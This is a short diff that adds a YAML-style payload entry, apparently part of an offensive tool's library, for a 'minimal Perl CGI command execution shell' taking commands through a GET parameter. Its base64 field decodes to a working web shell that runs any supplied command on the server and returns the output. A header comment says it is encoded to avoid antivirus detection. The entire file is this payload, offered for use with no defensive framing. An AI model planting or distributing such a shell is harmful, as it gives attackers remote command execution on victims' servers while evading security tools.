@@ -1,0 +1,9 @@
+﻿# Perl web shell payload - base64 encoded to prevent AV detection
+shell_type: perl
+description: "Minimal Perl CGI command execution shell"
+cmd_param: cmd
+method: GET
+output_start: "SHELL_START"
+output_end: "SHELL_END"
+extra_headers: {}
+payload_b64: "IyEvdXNyL2Jpbi9wZXJsIHVzZSBDR0kgcXcoOnN0YW5kYXJkKTsgbXkgJGNtZD1wYXJhbSgiY21kIik7IGlmKCRjbWQpe3ByaW50IGhlYWRlcjsgcHJpbnQgIlNIRUxMX1NUQVJUIjsgcHJpbnQgYCRjbWQgMj4mMWA7IHByaW50ICJTSEVMTF9FTkQiO30="
